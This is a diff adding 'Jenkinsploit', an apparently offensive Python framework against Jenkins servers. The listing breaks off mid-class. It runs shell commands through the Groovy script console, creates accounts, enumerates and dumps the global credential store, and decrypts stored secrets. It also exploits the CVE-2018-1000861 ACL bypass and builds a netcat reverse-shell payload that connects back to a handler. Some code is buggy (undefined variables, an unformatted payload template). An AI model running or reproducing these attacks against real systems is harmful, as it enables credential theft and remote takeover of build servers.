@@ -1,0 +1,875 @@
+#!/usr/bin/python3
+#
+#############################################################################################
+#
+#                                            ▄
+#                                          ┌▓▓▓
+#                                         ╓▓▓▓▓▓
+#                                        #▓▓▓▓▓▓▓,
+#                                       ▓▓▓▓▓▓▓▓▓▓▄
+#                                     .▓▓▓▓▓██▓▓▓▓▓▄
+#                                    ┌▓▒▓▓▓█  ▀▓▓▓▓▓▓
+#                                   ▄▒▒▒▓▓▀    ▀▓▓▓▓▓▓
+#                                  #▒▒▒▒▓▀      ╙▓▓▓▓▒▓u
+#                                 ▓▒▒▒▒▒╜        └▓▓▓▒▒▒▄
+#                               ┌▓▒▒▒▒▒"           █▓▒▒▒▒▒
+#                              ╓▒▒▒▒▒▓              ▀▒▒▒▒▒▓
+#                             #▒▒▒▒▒▓                ▀▒▒▒▒▒▓
+#                            ▒▒▒▒▒▒▀                  ╙▒▒▒▒▒▒▄
+#                          ┌▓▒▒▒▒▒╜                    ╙▒▒▒▒▒▒▄
+#                         ╒▒▒▒▒▒▒Ö                      └▓▒▒▒▒▒▒
+#                        #▒▒▒▒▒▒.                         ▓▒▒▒▒▒▓
+#                       ▒▒▒▒▒▒▓                            ▀▒▒▒▒▒▓,
+#                     .▓▒▒▒▒▒▀                              ▀▒▒▒▒▒▒▄
+#                    ┌▓▒▒▒▒▒╜                                ╙▒▒▒▒▒▒N
+#                   ╔▒▒▒▒▒▒╜                                  ╙▒▒▒▒▒▒▓
+#                  #▒▒▒▒▒▒Ö                                    └▓▒▒▒▒▒▓
+#                 ▒▒▒▒▒▒▒   mmmmmmmmmmmmm╖.    ╒mmmm╗╗╗╗╗╗╗╗╗╗   ▓▒▒▒▒▒▒,
+#               ┌▓▒▒▒▒▒▓  .Ñ▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▓   ╞▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓⌐  ▀▒▒▒▒▒▒▄
+#              ╓▒▒▒▒▒▒▀                  ▒▒▒▓                      ╙▒▒▒▒▒▒▒
+#             #▒▒▒▒▒▒Ñ   ƒ##R            ║▒▒▒  [▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ╙▒▒▒▒▒▒▓
+#            ▒▒▒▒▒▒▒╙   #▒▒▓             ║▒▒▒  └╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙º   └▒▒▒▒▒▒▓
+#          .▓▒▒▒▒▒▒"   #▒▒▓             ╓▓▒▒▓                          ▓▒▒▒▒▒▒p
+#         ╓▒▒▒▒▒▒▓    ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╜   ╞▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓    ▓▒▒▒▒▒▒▄
+#        #▒▒▒▒▒▒▓     """"""""""""""""""└       ""└└└└└└└└└└└└└└└"""└    ▀▒▒▒▒▒▒▒
+#       #▒▒▒▒▒▒▒##########################################################▒▒▒▒▒▒▒▓
+#     .▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓,
+#     ╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙╙
+# [ The Jenkinsploit Framework ]-[ @k0fin ]-[ Dark Element ]-[ darkelement.io ]-[ 2021 ]
+#
+# ~ usage: jenkinsploit -h
+#
+#############################################################################################
+
+import sys
+import os
+import glob
+import requests
+import re
+import random
+import time
+import datetime
+import netaddr
+import subprocess
+import base64
+import json
+import urllib.parse
+import logging
+import threading
+import time
+import curlify
+
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from webdriver_manager.chrome import ChromeDriverManager
+
+from bs4 import BeautifulSoup
+from argparse import ArgumentParser
+
+URL_FILE = "./jkntargets.txt"
+JITTER = 1
+
+capabilities_list = []
+capabilities_list.append("/script")
+capabilities_list.append("/signup")
+capabilities_list.append("/search?q=")
+capabilities_list.append("/credentials")
+capabilities_list.append("/computer")
+capabilities_list.append("/manage")
+capabilities_list.append("/configure")
+capabilities_list.append("/configureSecurity")
+capabilities_list.append("/systemInfo")
+capabilities_list.append("/securityRealm")
+
+script_list = []
+TARGET_URL = None
+JENKINSPLOIT_MODULES = glob.glob("/home/kali/jenkinsploit-framework/modules/*")
+
+class ColorOut:
+
+    def __init__(self, str, char='-'):
+
+        self.str = str
+        self.char = char
+
+    def red(self):
+        print('\033[1;31m{}\033[1;m{}'.format(self.char,self.str))
+
+    def blue(self):
+        print('\033[1;34m{}\033[1;m{}'.format(self.char,self.str))
+
+    def green(self):
+        print('\033[1;32m{}\033[1;m{}'.format(self.char,self.str))
+
+    def white(self):
+        print('\033[1;37m{}\033[1;m{}'.format(self.char,self.str))
+
+    def purple(self):
+        print('\033[1;35m{}\033[1;m{}'.format(self.char,self.str))
+
+    def nocolor(self):
+        print('{}{}'.format(self.char,self.str))
+
+class JenkinsScriptConsole:
+
+    def __init__(self, host, port, groovy, crumb):
+
+        self.host = host
+        self.port = port
+        self.groovy = groovy
+        self.crumb = crumb
+
+    def script_exec(self):
+
+        rheaders = {'Host': 'localhost:8080', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://localhost:8080/script', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '376', 'Origin': 'http://localhost:8080', 'Connection': 'keep-alive', 'Cookie': rsession_setup["cookie"], 'Upgrade-Insecure-Requests': '1'}
+        rpayload = "script={}&Jenkins-Crumb={}&json=%7B%22script%22%3A+%22println%28%5C%22ls+-l%5C%22.execute%28%29.text%29%22%2C+%22%22%3A+%22%5C%22ls+-l%5C%22.execute%28%29.text%22%2C+%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Run".format(self.groovy.replace(" ","+").replace("/", "%2F").replace(";", "%3B"), self.crumb, self.crumb)
+        ColorOut(" Sending request to Groovy console at {}/script to execute Groovy source code: {}".format(self.url.rstrip("/"), self.groovy), char="[*]").blue()
+
+        r = requests.post("{}/script".format(url.rstrip("/")), headers=rheaders, data=rpayload)
+
+        return r
+
+class JenkinsConnect:
+
+    def __init__(self, url):
+
+        self.url = url.rstrip('/')
+        self.s = requests.Session()
+        self.s.get("http://localhost:8080")
+
+    def anonymous_connect(self):
+
+        return self.s
+
+    def session(self, session):
+
+        self.s = requests.Session()
+
+        cookie_var = session.split('=')[0]
+        cookie_val = session.split('=')[1]
+
+        cookies = {
+            cookie_var: cookie_val,
+        }
+
+        headers = {
+           'Host': 'localhost:8080',
+           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+           'Accept-Language': 'en-US,en;q=0.5',
+           'Accept-Encoding': '',
+           'Referer': 'http://localhost:8080/login?from=%2F',
+           'Connection': 'keep-alive',
+           'Upgrade-Insecure-Requests': '1',
+           'Sec-Fetch-User': '?1',
+           'Sec-Fetch-Dest': 'document',
+           'Sec-Fetch-Mode': 'navigate',
+           'Sec-Fetch-Site': 'same-origin',
+        }
+
+        self.s.cookies.set(cookie_var, cookie_val)
+
+        response = self.s.get('http://localhost:8080/', headers=headers)
+
+        if response.status_code == 200:
+            print("[+] Successfully inherited authenticated session context to Jenkins instance with session cookie: {}".format(session))
+            return self.s
+
+        else:
+            print("[-] Session cookie is not valid.")
+            return self.s
+
+    def login(self, user, passwd):
+
+        headers = {
+            'Host': 'localhost:8080',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'http://localhost:8080',
+            'Connection': 'keep-alive',
+            'Referer': 'http://localhost:8080/login?from=%2F',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+        }
+
+        data = {
+            'j_username': user,
+            'j_password': passwd,
+            'from': '/',
+            'Submit': 'Sign in'
+        }
+
+        response = self.s.post('http://localhost:8080/j_spring_security_check', headers=headers, data=data)
+
+        if response.status_code == 200:
+            print("[+] Successfully authenticated to target Jenkins instance as {}".format(user))
+            return self.s
+
+        print("[-] Authentication failed.")
+        return self.s
+
+def jenkins_convert_req(raw_request):
+    '''Converts a raw HTTP request headers and payload to Python Requests-compatible key-value pairs.
+       This makes it trivial to copy/paste a raw HTTP web request into a simple text file, read it, and
+       convert it to something that can be sent from a web client or easily parsed.'''
+
+    py_convert_request_text = dict([[h.partition(':')[0], h.partition(':')[2]] for h in raw_request.split('\n')])
+
+    for v in py_convert_request_text.keys():
+        py_convert_request_text[v] = py_convert_request_text[v].replace(" ", "")
+
+    return py_convert_request_text
+
+def jenkins_create_user(url, username, passwd):
+    '''Creates a Jenkins user account on the target instance'''
+    rsession_setup = jenkins_session_connect(url)
+    rawrequest = '''Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: http://localhost:8080
+Connection: keep-alive
+Referer: http://localhost:8080/signup
+Cookie: {}
+Upgrade-Insecure-Requests: 1'''.format(rsession_setup["cookie"])
+
+    rpayload = '''username={}&fullname=Jenkins+Web&email=jenkins%40web&remember_me=on&password1={}&password2={}&Submit=Create+account&Jenkins-Crumb={}'''.format(username, passwd, passwd, rsession_setup["crumb"])
+    rheaders = jenkins_convert_req(rawrequest)
+    r = requests.post("{}/securityRealm/createAccount".format(url.rstrip("/")), headers=rheaders, data=rpayload)
+
+    ColorOut(" Jenkins user account created! ( {}:{} )".format(username, passwd), char="[+]").green()
+
+def jenkins_delete_user(url, username):
+
+    rsession_setup = jenkins_session_connect(url)
+    rawrequest = '''Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8080/user/{}/delete
+Content-Type: application/x-www-form-urlencoded
+Origin: http://localhost:8080
+Connection: keep-alive
+Cookie: {}
+Upgrade-Insecure-Requests: 1'''.format(username, rsession_setup["cookie"])
+
+    rheaders = jenkins_convert_req(rawrequest)
+    rpayload = '''Jenkins-Crumb={}&json=%7B%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Yes'''.format(rsession_setup["crumb"], rsession_setup["crumb"])
+
+    ColorOut(" Sending request to delete Jenkins user: {}...".format(username), char="[+]").green()
+    r = requests.post("{}/user/{}/doDelete".format(url.rstrip("/"), username), headers=rheaders, data=rpayload)
+    ColorOut(" Jenkins user account deleted! ( {} )".format(username), char="[+]").green()
+
+    print(r.headers)
+
+def jenkins_session_connect(url):
+    '''Sends an empty HTTP GET request to a target Jenkins instance to retrieve session-state
+       values for later use'''
+    r = requests.get(url)
+
+    if r.status_code == 200 or r.status_code == 301:
+        r_soup = BeautifulSoup(r.text, "html.parser")
+
+        for obj in r_soup.find_all("head"):
+            jcrumb = obj["data-crumb-value"]
+            ColorOut("=" * 100, char="").blue()
+
+            return {"crumb":jcrumb, "cookie": r.headers["Set-Cookie"]}
+
+    else:
+        return {"crumb":"", "cookie":""}
+
+def jenkins_groovy_console_sh(url, cmd):
+    '''Submit POST request to Groovy scripting console to execute a shell command'''
+    rsession_setup = jenkins_session_connect(url)
+    rheaders = {'Host': 'localhost:8080', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://localhost:8080/script', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '376', 'Origin': 'http://localhost:8080', 'Connection': 'keep-alive', 'Cookie': '{}'.format(rsession_setup["cookie"]), 'Upgrade-Insecure-Requests': '1'}
+    rpayload = "script=println%28%22{}%22.execute%28%29.text%29&Jenkins-Crumb={}&json=%7B%22script%22%3A+%22println%28%5C%22ls+-l%5C%22.execute%28%29.text%29%22%2C+%22%22%3A+%22%5C%22ls+-l%5C%22.execute%28%29.text%22%2C+%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Run".format(cmd.replace(" ","+").replace("/", "%2F").replace(";", "%3B"), rsession_setup["crumb"], rsession_setup["crumb"])
+    ColorOut(" Sending request to Groovy console at {}/script to execute shell command: {}".format(url.rstrip("/"), cmd), char="[*]").blue()
+
+    r = requests.post("{}/script".format(url.rstrip("/")), headers=rheaders, data=rpayload)
+
+    if not r.status_code == 200:
+        ColorOut(" ERROR: HTTP {}".format(r.status_code), char="[-]").red()
+
+        return False
+
+    e_soup = BeautifulSoup(r.text, "html.parser")
+    print("=" * 50)
+    print("Groovy Console Bash Execution")
+    print("=" * 50)
+
+    for e in e_soup.find_all("pre"):
+        if not e.getText().startswith("println"):
+            print(e.getText().strip())
+
+    print("=" * 50)
+
+    return True
+
+def jenkins_groovy_console_exec(url, gscript):
+    '''Submit POST request to Groovy scripting console to execute Groovy scripting code'''
+    rsession_setup = jenkins_session_connect(url)
+    rheaders = {'Host': 'localhost:8080', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://localhost:8080/script', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '376', 'Origin': 'http://localhost:8080', 'Connection': 'keep-alive', 'Cookie': '{}'.format(rsession_setup["cookie"]), 'Upgrade-Insecure-Requests': '1'}
+    rpayload = "script={}&Jenkins-Crumb={}&json=%7B%22script%22%3A+%22println%28%5C%22ls+-l%5C%22.execute%28%29.text%29%22%2C+%22%22%3A+%22%5C%22ls+-l%5C%22.execute%28%29.text%22%2C+%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Run".format(gscript.replace(" ","+").replace("/", "%2F").replace(";", "%3B"), rsession_setup["crumb"], rsession_setup["crumb"])
+    ColorOut(" Sending request to Groovy console at {}/script to execute Groovy source code: {}".format(url.rstrip("/"), gscript), char="[*]").blue()
+    r = requests.post("{}/script".format(url.rstrip("/")), headers=rheaders, data=rpayload)
+
+    if not r.status_code == 200:
+        ColorOut(" ERROR: HTTP {}".format(r.status_code), char="[-]").red()
+
+        return False
+
+    e_soup = BeautifulSoup(r.text, "html.parser")
+    print("=" * 50)
+    print("Groovy Scripting Console Source Code")
+    print("=" * 50)
+
+    for e in e_soup.find_all("pre"):
+        if not e.getText().startswith("println"):
+            e_buf = e.getText().strip().rsplit("\n")
+
+            for e_obj in e_buf:
+                if "password>" in e_obj:
+                    print(e_obj)
+
+        else:
+            continue
+
+    print("=" * 50)
+
+    return True
+
+def jenkins_decrypt_global_credential(url, cred_ids=[1]):
+    '''Sends request to target Jenkins instance
+       containing URL-encoded Groovy scripting source
+       code to decrypt the Global credential store password'''
+    rsession_setup = jenkins_session_connect(url)
+
+    for cred in cred_ids:
+        ColorOut(" Sending credential update request for credential ID {}...\n".format(cred), char="[*]").blue()
+        c_dump = requests.get("http://localhost:8080/credentials/store/system/domain/_/credential/{}/update".format(cred))
+
+        if not c_dump.status_code == 200:
+            ColorOut(" ERROR: HTTP {}".format(r.status_code), char="[-]").red()
+
+            return False
+
+        c_dsoup = BeautifulSoup(c_dump.text, "html.parser")
+
+        for obj in c_dsoup.find_all("input", {"checkmethod":"post"}):
+            ColorOut(" Successful! Encrypted password value found: {}".format(obj["value"]), char="[+]").green()
+
+            gscript = 'println(hudson.util.Secret.decrypt("{}"))'.format(urllib.parse.quote_plus(obj["value"]))
+            rheaders = {'Host': 'localhost:8080', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://localhost:8080/script', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '376', 'Origin': 'http://localhost:8080', 'Connection': 'keep-alive', 'Cookie': rsession_setup["cookie"], 'Upgrade-Insecure-Requests': '1'}
+            rpayload = "script={}&Jenkins-Crumb={}&json=%7B%22script%22%3A+%22println%28%5C%22ls+-l%5C%22.execute%28%29.text%29%22%2C+%22%22%3A+%22%5C%22ls+-l%5C%22.execute%28%29.text%22%2C+%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Run".format(gscript.replace(" ","+").replace("/", "%2F").replace(";", "%3B"), rsession_setup["crumb"], rsession_setup["crumb"])
+            ColorOut(" Sending request to Groovy console at {}/script to execute Groovy source code: {}".format(url.rstrip("/"), gscript), char="[*]").blue()
+
+            r = requests.post("{}/script".format(url.rstrip("/")), headers=rheaders, data=rpayload)
+
+            if not r.status_code == 200:
+                ColorOut(" ERROR: HTTP {}".format(r.status_code), char="[-]").red()
+
+                return False
+
+            e_soup = BeautifulSoup(r.text, "html.parser")
+            for e in e_soup.find_all("pre"):
+
+                if not e.getText().startswith("println"):
+                    ColorOut(" Decrypted Global Credentials: {}".format(e.getText().strip())).green()
+
+            print("=" * 50)
+
+    return True
+
+
+def jenkins_groovy_reverse_shell(handler,lport,target,rport):
+    '''Generate Groovy script to connect back to reverse shell handler/C2 listener'''
+    h = handler
+    p = lport
+
+    groovy_callback = "script=def%20proc%20%3D%20%22%2Fusr%2Fbin%2Fnc%20-e%20%2Fbin%2Fsh%20%7B%7D%20%7B%7D%22.execute%28%29%3Bdef%20os%20%3D%20new%20StringBuffer%28%29%3Bproc.waitForProcessOutput%28os%2C%20System.err%29%3Bprintln%28os.toString%28%29%29%3B%22Jenkins-Crumb%22%3A+%22{}%22%7D&Submit=Run"
+
+    return groovy_callback
+
+def jenkinsploit_banner():
+    '''Print the Jenkinsploit command-line banner'''
+    banner_file = random.choice(glob.glob("/home/kali/jenkinsploit-framework/banners/*"))
+
+    with open(banner_file, "r") as b_file:
+        print(b_file.read())
+
+def jenkinsploit_screenshot(url, fname):
+    '''Take a screenshot of a target Jenkinsploit instance'''
+    options = webdriver.ChromeOptions()
+    options.headless = True
+    ColorOut(" Starting headless Chromium webdriver", char="[*]").blue()
+    driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
+
+    ColorOut(" Sending GET request to target Jenkins instance via webdriver object...", char="[*]").blue()
+    driver.get(url)
+
+    S = lambda X: driver.execute_script('return document.body.parentNode.scroll'+X)
+    driver.set_window_size(S('Width'),S('Height'))
+    driver.find_element_by_tag_name('body').screenshot('{}'.format(fname))
+
+    ColorOut(' Screenshot written to {}'.format(fname), char="[+]").green()
+
+    driver.quit()
+
+def load_targets_file():
+
+    global URL_FILE
+
+    try:
+        with open(URL_FILE, 'r') as external_url_file:
+
+            external_urls = external_url_file.read().strip().split('\n')
+            print('[*] Loaded {} Jenkins instance target URLs...'.format(len(external_urls)))
+
+            return external_urls
+
+    except:
+        print("[-] Target file not found: {}".format(URL_FILE))
+
+        return False
+
+def jenkins_enumerate_capabilities():
+    '''Enumerate Jenkins capabilities/endpoints from main Dashboard panel'''
+    global TARGET_URL
+    global capabilities_list
+
+    print("=" * 50)
+    print("Jenkins Target Capabilities")
+    print("=" * 50)
+
+    for c in capabilities_list:
+        print("[ {} ] {}/{}".format(requests.get("{}/{}".format(TARGET_URL.rstrip("/"), c)).status_code, TARGET_URL, c.split("/").pop()))
+
+    print("\n")
+
+def jenkins_opensearch_suggest(url):
+    '''Send an HTTP GET request to a target Jenkins instance at /search/suggestOpenSearch'''
+    user_ids = []
+    ColorOut(" Attempting to access suggestOpenSearch...", char="[*]").blue()
+    c_dump = requests.get("{}/search/suggestOpenSearch?q=".format(url.rstrip("/")))
+
+    if c_dump.status_code != 200:
+        print("[-] ERROR: {}".format(c_dump.status_code))
+
+        return False
+
+    c_dump_buf = c_dump.text.strip().replace("[","").replace("]","").replace('"','').split(',')
+    ColorOut(" OpenSearch strings collected from Jenkins web server response body:\n", char="[+]").green()
+
+    for c in c_dump_buf:
+        ColorOut(" {}".format(c)).green()
+
+    print("\n")
+
+def jenkins_signup(url):
+    '''Lorem ipsum dolor emet'''
+    user_ids = []
+    ColorOut(" Attempting to anonymously access /signup endpoint...", char="[*]").blue()
+    c_dump = requests.get("{}/signup".format(url.rstrip("/")))
+
+    if c_dump.status_code != 200:
+        print("[-] ERROR: {}".format(c_dump.status_code))
+        return False
+
+    ColorOut(" Got an HTTP {}!".format(c_dump.status_code), char="[*]").blue()
+    c_soup = BeautifulSoup(c_dump.text, "html.parser")
+
+    for c in c_soup.find_all("title"):
+        if "Create an account! [Jenkins]" in c.getText():
+            ColorOut(" Jenkins sign-up page is accessible!\n", char="[+]").green()
+
+def jenkins_enumerate_domain_credential_store():
+    '''Enumerate Global Credential Store on target Jenkins instance'''
+    credential_ids = []
+    print("[*] Attempting to enumerate global credential store on target Jenkins instance...")
+    c_dump = requests.get("http://localhost:8080/credentials/store/system/domain/_/")
+
+    if c_dump.status_code != 200:
+        print("[-] ERROR: {}".format(c_dump.status_code))
+        return False
+
+    ColorOut(" Anonymous READ access enabled!\n", char="[+]").green()
+    c_dsoup = BeautifulSoup(c_dump.text, "html.parser")
+
+    for obj in c_dsoup.find_all("a", {"class":"model-link inside"}):
+        if obj["href"].split("/").pop() not in credential_ids and not obj["href"].endswith("/"):
+            credential_ids.append(obj["href"].split("/").pop())
+
+    print("\n")
+
+    return credential_ids
+
+def jenkins_dump_domain_credential_store(cred_ids=None):
+    '''Dump credentials from global credential store on target Jenkins instance'''
+    if not cred_ids:
+        cred_ids = [1]
+
+    for cred in cred_ids:
+        print("[*] Sending credential update request for credential ID 1...\n")
+        c_dump = requests.get("http://localhost:8080/credentials/store/system/domain/_/credential/{}/update".format(cred))
+
+        if c_dump.status_code != 200:
+            print("[-] ERROR: {}".format(c_dump.status_code))
+            sys.exit()
+
+        ColorOut(" Anonymous READ access enabled!\n", char="[+]").green()
+        c_dsoup = BeautifulSoup(c_dump.text, "html.parser")
+
+        for obj in c_dsoup.find_all("input", {"checkmethod":"post"}):
+            print("[+] Successful! Encrypted password value found: {}".format(obj["value"]))
+            print('[*] Groovy Scripting Console Password Decryption: println(hudson.util.Secret.decrypt("{}"))'.format(obj["value"]))
+
+        print("\n")
+
+def jenkins_fingerprint_headers(url):
+    '''Jenkins Dashboard response header fingerprinting'''
+    fingerprint_version = requests.get(url)
+
+    if fingerprint_version.status_code != 200:
+        print("[-] ERROR: {}".format(fingerprint_version.status_code))
+        sys.exit()
+
+    fprint_headers = fingerprint_version.headers
+
+    ColorOut(" Jenkins Version       : {}".format(fprint_headers["X-Jenkins"]), char="[+]").green()
+    ColorOut(" Hudson Version        : {}".format(fprint_headers["X-Hudson"]), char="[+]").green()
+    ColorOut(" Jenkins Session       : {}".format(fprint_headers["X-Jenkins-Session"]), char="[+]").green()
+    ColorOut(" Web Server Version    : {}".format(fprint_headers["Server"]), char="[+]").green()
+    ColorOut(" X-Instance Public Key : {}".format(fprint_headers["X-Instance-Identity"]), char="[+]").green()
+
+def jenkins_fingerprint_instance(url):
+    '''Jenkins Dashboard HREF Fingerprinting'''
+    fingerprint_version = requests.get(url)
+
+    if fingerprint_version.status_code != 200:
+        ColorOut(" ERROR: {}".format(fingerprint_version.status_code), char="[-]").red()
+        sys.exit()
+
+    fprint_headers = fingerprint_version.headers
+    fprint_soup = BeautifulSoup(fingerprint_version.text, "html.parser")
+
+    for obj in fprint_soup.find_all("a"):
+        if obj.getText().startswith("Jenkins "):
+            ColorOut(" Jenkins version fingerprint found (via HREF): {}".format(obj.getText()), char="[*]").blue()
+
+def jenkins_acl_bypass(url):
+    '''CVE-2018-1000861, Jenkins <2.150.1 will leak information without having to provide authentication'''
+    acl_bypass = requests.get("{}/securityRealm/user/admin/search/index?q=a".format(url.rstrip("/")))
+    ColorOut(" Got a 200 from submitted ACL bypass request!", char="[+]").green()
+    acl_soup = BeautifulSoup(acl_bypass.text, "html.parser")
+    acl_hrefs = []
+
+    for obj in acl_soup.find_all("a"):
+        try:
+            if not obj["href"].startswith("http"):
+                acl_hrefs.append(obj["href"])
+
+        except KeyError:
+            continue
+
+    acl_hrefs_sorted = sorted(list(set(acl_hrefs)))
+    print("=" * 50)
+    print("Jenkins ACL Bypass HREF URLs")
+    print("=" * 50)
+
+    for acl_h in acl_hrefs_sorted:
+        ColorOut(" Found HREF: {}".format(acl_h)).green()
+
+    print("=" * 50)
+
+    return acl_hrefs_sorted
+
+def jenkins_system_info(url):
+    '''Get Jenkins system info via HTTP GET
+       request to the /systemInfo endpoint'''
+    ColorOut(" Attempting to retrieve Jenkins system information...", char="[*]").blue()
+    r = requests.get("{}/systemInfo".format(url.rstrip("/")))
+
+    if r.status_code == 200:
+        ColorOut(" HTTP 200 received!\n", char="[+]").green()
+        r_soup = BeautifulSoup(r.text, "html.parser")
+
+        for obj in r_soup.find_all("title"):
+            if "System Information [Jenkins]" in obj.getText():
+                ColorOut(" Jenkins System Information is accessible!\n", char="[+]").green()
+
+                jenkinsploit_screenshot("{}/systemInfo".format(url).rstrip("/"), "./jenkins-localhost-systeminfo.png")
+
+class JenkinsploitPayloadGenerator:
+
+    def __init__(self, payload):
+
+        self.payload = payload
+
+    def oneliner(self, method=None):
+
+        pass
+
+
+
+class JenkinsploitSessionHandler:
+
+    def __init__(self, session):
+
+        self.session = session
+
+    def getCapabilities(self):
+
+#        global TARGET_URL
+        global capabilities_list
+
+        print("=" * 50)
+        print("Capabilities")
+        print("=" * 50)
+
+        for c in capabilities_list:
+            print("[ {} ] {}/{}".format(self.session.get("http://localhost:8080{}".format(c)).status_code, "http://localhost:8080", c.split("/").pop()))
+
+        print("=" * 50)
+        print("\n")
+
+        return self.session
+
+    def getVersion(self, method=None):
+
+        fingerprint_req = self.session.get("http://localhost:8080")
+        fingerprint_soup = BeautifulSoup(fingerprint_req.text, "html.parser")
+
+        print(fingerprint_req.headers.keys())
+        print("\n")
+
+        return self.session
+
+    def getCurrentUser(self):
+
+        whoami_req = self.session.get("http://localhost:8080/me/api/json")
+#        print(whoami_req)
+        print(whoami_req.json()['id'])
+
+        print("\n")
+
+        return self.session
+
+    def getUsers(self, username=None):
+        user_ids = []
+        print("[*] Attempting user enumeration via /asynchPeople...\n")
+        c_dump = self.session.get("http://localhost:8080/asynchPeople/api/json")
+
+        if c_dump.status_code != 200:
+            print("[-] ERROR: {}".format(c_dump.status_code))
+
+            return False
+
+        ColorOut(" Jenkins user enumeration successful!\n", char="[+]").green()
+
+        print("=" * 50)
+        print("Jenkins Users")
+        print("=" * 50)
+        userkeys = json.loads(c_dump.text)["users"]
+
+        for user in userkeys:
+            print("{0:10} - {1:5}".format(user["user"]["absoluteUrl"].split("/").pop(), user["user"]["absoluteUrl"]))
+
+        print("=" * 50)
+
+        return self.session
+
+    def getNodes(self, node=None):
+        node_req = self.session.get("http://localhost:8080/computer")
+        node_soup = BeautifulSoup(node_req.text, "html.parser")
+
+        for node in node_soup.find_all("title"):
+            print(node)
+
+        return self.session
+
+    def getCredentials(self, username=None):
+
+        fingerprint_req = self.session.get("http://localhost:8080")
+        fingerprint_soup = BeautifulSoup(fingerprint_req.text, "html.parser")
+
+        print(fingerprint_req.headers.keys())
+        print("\n")
+
+        return self.session
+
+    def getSystemInfo(self):
+
+        ColorOut(" Attempting to retrieve Jenkins system information...", char="[*]").blue()
+        r = self.session.get("http://localhost:8080/systemInfo")
+
+        if r.status_code == 200:
+            r_soup = BeautifulSoup(r.text, "html.parser")
+
+            for obj in r_soup.find_all("title"):
+                if "System Information [Jenkins]" in obj.getText():
+                    ColorOut(" Jenkins System Information is accessible!\n", char="[+]").green()
+
+        return self.session
+
+    def getPlugins(self):
+
+        plugin_req = self.session.get("http://localhost:8080/pluginManager/")
+        plugin_soup = BeautifulSoup(plugin_req.text, "html.parser")
+
+        print(plugin_req.headers)
+        print("\n")
+
+        return self.session
+
+    def evalACLBypass(self):
+
+        acl_bypass = self.session.get("http://localhost:8080/securityRealm/user/admin/search/index?q=a")
+        ColorOut(" Got a 200 from submitted ACL bypass request!", char="[+]").green()
+        acl_soup = BeautifulSoup(acl_bypass.text, "html.parser")
+        acl_hrefs = []
+
+        for obj in acl_soup.find_all("a"):
+            try:
+                if not obj["href"].startswith("http"):
+                    acl_hrefs.append(obj["href"])
+
+            except KeyError:
+                continue
+
